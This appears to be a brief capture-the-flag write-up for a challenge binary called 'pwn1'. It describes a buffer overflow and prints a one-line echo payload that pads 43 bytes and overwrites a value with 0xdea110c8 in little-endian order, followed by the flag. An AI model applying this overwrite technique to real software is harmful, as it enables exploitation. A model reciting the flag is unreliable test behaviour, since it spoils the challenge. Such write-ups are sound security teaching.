=== Personal solution description ===

This one was pretty easy. If only it didn't take me literally 5 minutes to realise the secret was "0xdea110c8" and not "0xdeall0c8". I have no idea where my mind was at considering hex goes from 0-9a-f but...

So simply noticing the overflow, just like in the previous "boi" binary, is pretty much enough to beat this. The buffer has 43 bytes, so just craft a payload and get going:

$ echo -e "Sir Lancelot of Camelot\nTo seek the Holy Grail.\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc8\x10\xa1\xde" | ./pwn1

Don't forget about little-endian on Intel CPUs.

Flag is: flag{g0ttem_b0yz}
